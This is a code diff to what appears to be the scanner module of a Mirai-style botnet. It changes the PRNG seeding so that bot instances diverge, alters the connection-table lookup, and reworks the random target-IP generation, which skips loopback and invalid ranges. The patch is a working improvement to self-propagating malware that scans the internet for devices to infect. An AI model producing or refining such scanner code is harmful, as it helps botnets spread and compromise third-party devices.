@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #ifdef DEBUG
 #include <stdio.h>
 #endif
@@ -262,6 +263,12 @@ void scanner_init(void)
 
     scanner_pid = getpid();
     program_pid = getppid();
+	
+	size_t temp = 0;
+	for(temp = 0; temp < program_pid/10; temp++)
+	{
+		rand_next();
+	}
 
     source_port = rand_next() & (0xFFFF-4096);
     source_port += 4096;
@@ -562,7 +569,7 @@ void scanner_init(void)
             */
 
             conn = NULL;
-            for (res = last_avail_conn; res < SCANNER_MAX_CONNS; res++)
+            for (res = 0; res < SCANNER_MAX_CONNS; res++)
             {
                 if(conn_table[res].dst_addr == iph->saddr)
                 {
@@ -1068,14 +1075,11 @@ static uint32_t get_random_ip(void)
 
     do
     {
-        tmp = lcg_rand(&seed);
-
-        o1 = (rand_next()) & 0xff;
-        o2 = (tmp >> 8)& 0xff;
-        o3 = (tmp >> 16) & 0xff;
-        o4 = (rand_next()) & 0xff;
+        o1 = rand_next();
+        o2 = rand_next() >> 8;
+        o3 = rand_next() >> 16;
+        o4 = rand_next() >> 24;
 		tmp = INET_ADDR(o1,o2,o3,o4);
-		seed = tmp+1;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
             (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
